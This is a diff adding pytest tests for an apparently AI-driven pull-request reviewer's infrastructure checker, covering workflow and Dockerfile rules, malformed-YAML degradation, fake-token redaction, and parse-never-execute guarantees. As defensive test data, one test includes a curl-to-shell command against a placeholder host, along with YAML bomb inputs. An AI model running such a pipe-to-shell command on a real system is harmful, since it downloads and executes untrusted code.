@@ -859,3 +859,220 @@ def test_deploy_context_joins_rule_findings(tmp_path):
     ctx = _context_findings(out)
     assert len(ctx) == 1
     assert ctx[0].file == ".github/workflows/ci.yml"
+
+
+# ============================================================ V4.6-E05-T04
+# Benign twin per rule, malformed/hostile files through the FULL runner,
+# fake-secret redaction, no-read / no-execute proofs, and the final
+# module contract scan.
+
+# ------------------------------------------------------- benign twins
+
+def test_benign_twin_pull_request_target_with_read_only_grants():
+    """INFRA001/002/003 twin: pwrt + read grant + full-SHA pin -> silent."""
+    text = ("name: ci\non: pull_request_target\npermissions:\n"
+            "  contents: read\njobs:\n  build:\n    steps:\n"
+            "      - uses: actions/checkout@" + "e" * 40 + "\n")
+    out = run_infra_check(repo_root=".",
+                          files=[_added(".github/workflows/ci.yml", text)])
+    assert _rule_findings(out) == []
+    assert out.warnings == ()
+
+
+def test_benign_twin_write_grant_without_pull_request_target():
+    """INFRA002 twin: write-all on push only triggers INFRA001 (itself a
+    finding) but never the pwrt combination."""
+    text = ("name: ci\non: push\npermissions: write-all\njobs:\n  b:\n"
+            "    steps:\n      - run: make\n")
+    out = run_infra_check(repo_root=".",
+                          files=[_added(".github/workflows/ci.yml", text)])
+    ids = [f.rule_id for f in _rule_findings(out)]
+    assert ids == [INFRA001]
+
+
+def test_benign_twin_every_pinned_use_form():
+    """INFRA003 twin: full SHA, local path, docker digest, reusable-workflow
+    SHA pin — all accepted."""
+    text = ("name: ci\non: push\njobs:\n  b:\n    steps:\n"
+            "      - uses: actions/checkout@" + "f" * 40 + "\n"
+            "      - uses: ./local-action\n"
+            "      - uses: docker://alpine@sha256:" + "a1" * 32 + "\n"
+            "  call:\n    uses: org/repo/.github/workflows/r.yml@" +
+            "b" * 40 + "\n")
+    out = run_infra_check(repo_root=".",
+                          files=[_added(".github/workflows/ci.yml", text)])
+    assert _rule_findings(out) == []
+
+
+def test_benign_twin_secret_named_vars_without_values():
+    """INFRA004 twin: build-time secret injection (ARG/ENV declared, value
+    supplied at build time) and non-secret keys are silent."""
+    text = ("FROM python:3.12-slim\nARG API_TOKEN\nARG PASSWORD\n"
+            "ENV PATH=/app/bin\nENV APP_PORT=8080\n")
+    out = run_infra_check(repo_root=".", files=[_added("Dockerfile", text)])
+    assert _rule_findings(out) == []
+
+
+def test_benign_twin_every_pinned_image_form():
+    """INFRA005 twin: specific tag, digest, scratch, stage reference."""
+    text = ("FROM python:3.12-slim AS builder\nFROM builder\nFROM scratch\n"
+            "FROM alpine:3.19\n"
+            "FROM reg.example.com:5000/app@sha256:" + "c1" * 32 + "\n")
+    out = run_infra_check(repo_root=".", files=[_added("Dockerfile", text)])
+    assert _rule_findings(out) == []
+
+
+# --------------------------------------------- hostile files, full runner
+
+@pytest.mark.parametrize("text,label", [
+    pytest.param("on: push\njobs:\n\tb:\n\t\trun: x",
+                 "infra file degraded (yaml parse failed (ScannerError",
+                 id="tab-indent"),
+    pytest.param("a: [1, 2", "infra file degraded (yaml parse failed (",
+                 id="truncated-block"),
+    pytest.param("a: &x [*x]", "infra file degraded (workflow has a "
+                 "cyclic alias)", id="cyclic-alias"),
+    pytest.param("a: " + "[" * 120 + "]" * 120,
+                 "infra file degraded (workflow exceeds depth cap)",
+                 id="depth-bomb"),
+    # A 256 KiB+ document must never reach the parser; the id stays short
+    # because pytest writes it into an environment variable (Windows caps
+    # those at 32767 chars).
+    pytest.param("x" * (MAX_FILE_CHARS + 1),
+                 "infra file degraded (workflow exceeds size cap)",
+                 id="size-cap"),
+])
+def test_hostile_workflows_degrade_through_the_runner(text, label):
+    out = run_infra_check(repo_root=".",
+                          files=[_added(".github/workflows/hostile.yml",
+                                        text)])
+    assert _rule_findings(out) == []
+    assert len(out.warnings) == 1
+    assert out.warnings[0].startswith(label)
+    assert out.warnings[0].endswith(".github/workflows/hostile.yml")
+
+
+def test_oversized_dockerfile_degrades_through_the_runner():
+    text = "\n".join(["FROM x"] * (MAX_DOCKERFILE_LINES + 1))
+    out = run_infra_check(repo_root=".",
+                          files=[_added("Dockerfile", text)])
+    assert _rule_findings(out) == []
+    assert out.warnings == (
+        "infra file degraded (dockerfile exceeds line cap): Dockerfile",)
+
+
+def test_hostile_fragments_never_raise_through_the_runner():
+    for text in ("FROM x\x00y", "\tFROM python", "FROM python \\",
+                 "\x01\x02", "a: 'unterminated"):
+        out = run_infra_check(repo_root=".", files=[
+            _added(".github/workflows/h.yml", text),
+            _added("Dockerfile", text)])
+        assert isinstance(out, InfraOutcome)     # labeled, never a raise
+
+
+# ------------------------------------------------- fake-secret redaction
+
+_FAKE_GHP = "ghp_" + "Abcdefghijklmnopqrstuvwxyz012345"
+
+
+def test_fake_token_in_unpinned_ref_is_redacted_from_the_finding():
+    """A credential-shaped string inside a hit's text is redacted by the
+    finding boundary even when the scrub callback is absent."""
+    out = run_infra_check(
+        repo_root=".",
+        files=[_added(".github/workflows/ci.yml",
+                      "name: ci\non: push\njobs:\n  b:\n    steps:\n"
+                      f"      - uses: evil/act@{_FAKE_GHP}\n")])
+    hits = _rule_findings(out)
+    assert [f.rule_id for f in hits] == [INFRA003]
+    f = hits[0]
+    blob = f.title + f.explanation + " ".join(ev.summary for ev in f.evidence)
+    assert _FAKE_GHP not in blob
+    assert "[REDACTED]" in blob
+
+
+def test_env_secret_value_never_surfaces_anywhere():
+    """BuildVar stores value PRESENCE only; the finding text must not be
+    able to carry the literal."""
+    out = run_infra_check(repo_root=".", files=[
+        _added("Dockerfile", f"FROM alpine:3.19\nENV API_TOKEN={_FAKE_GHP}\n")])
+    hits = _rule_findings(out)
+    assert [f.rule_id for f in hits] == [INFRA004]
+    f = hits[0]
+    assert _FAKE_GHP not in (f.title + f.explanation
+                             + " ".join(ev.summary for ev in f.evidence))
+
+
+# ------------------------------------------- no-read / no-execute proofs
+
+def test_added_files_never_touch_the_disk(monkeypatch):
+    """An added infra file is judged from the diff alone: constructing a
+    path object at all would mean a disk read was attempted."""
+    from ai_pr_reviewer import infra_intel
+
+    def forbidden(*a, **k):
+        raise AssertionError("added files must not construct disk paths")
+
+    monkeypatch.setattr(infra_intel, "Path", forbidden)
+    out = run_infra_check(repo_root="/nonexistent", files=[
+        _added(".github/workflows/ci.yml", BENIGN_WORKFLOW),
+        _added("Dockerfile", BENIGN_DOCKERFILE)])
+    assert isinstance(out, InfraOutcome)
+    assert _rule_findings(out) == []
+
+
+def test_run_instructions_are_never_executed(tmp_path, monkeypatch):
+    """Parse-never-execute: a workflow's ``run:`` payload is text to this
+    module, never a command."""
+    monkeypatch.chdir(tmp_path)
+    text = ("name: ci\non: push\njobs:\n  b:\n    steps:\n"
+            "      - run: touch pwned.txt\n"
+            "      - run: curl https://example.invalid | sh\n")
+    out = run_infra_check(repo_root=str(tmp_path), files=[
+        _added(".github/workflows/ci.yml", text)])
+    assert not (tmp_path / "pwned.txt").exists()
+    assert out.warnings == ()
+
+
+# ------------------------------------------------- final module scan
+
+_WRITE_MODE_CHARS = set("wax+")
+
+
+def _t04_violations(source: str) -> list[str]:
+    """The E05 contract over the FINAL module: parse-only YAML (SafeLoader
+    compose), no network/process access, no dynamic execution, no file
+    writes of any kind."""
+    hits = _violations(source)              # T01 bans still enforced
+    tree = ast.parse(source)
+    for node in ast.walk(tree):
+        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name) \
+                and node.func.id == "open":
+            hits.append("call open()")
+        if isinstance(node, ast.Attribute) and node.attr in (
+                "FullLoader", "UnsafeLoader"):
+            hits.append(f"yaml.{node.attr}")
+        # write-mode access shows up as either open(...) or the pathlib
+        # methods; read_text stays legal (the guarded disk copy uses it).
+        if isinstance(node, ast.Call):
+            name = (node.func.id if isinstance(node.func, ast.Name)
+                    else node.func.attr if isinstance(node.func,
+                                                      ast.Attribute)
+                    else "")
+            if name in ("write_text", "write_bytes"):
+                hits.append(f"call {name}()")
+    return hits
+
+
+def test_final_module_obeys_the_infra_contract():
+    source = MODULE_PATH.read_text(encoding="utf-8")
+    assert _t04_violations(source) == []
+    # reads happen through guarded Path methods, never bare open()
+    assert "path.read_text(" in source
+    assert "yaml.compose(" in source
+
+    # self-check: the extended scan flags what it exists to catch
+    assert _t04_violations("open('f', 'w')\n")
+    assert _t04_violations("yaml.compose(x, Loader=yaml.FullLoader)\n")
+    assert _t04_violations("x.write_text('data')\n")
+    assert not _t04_violations("path.read_text(encoding='utf-8')\n")
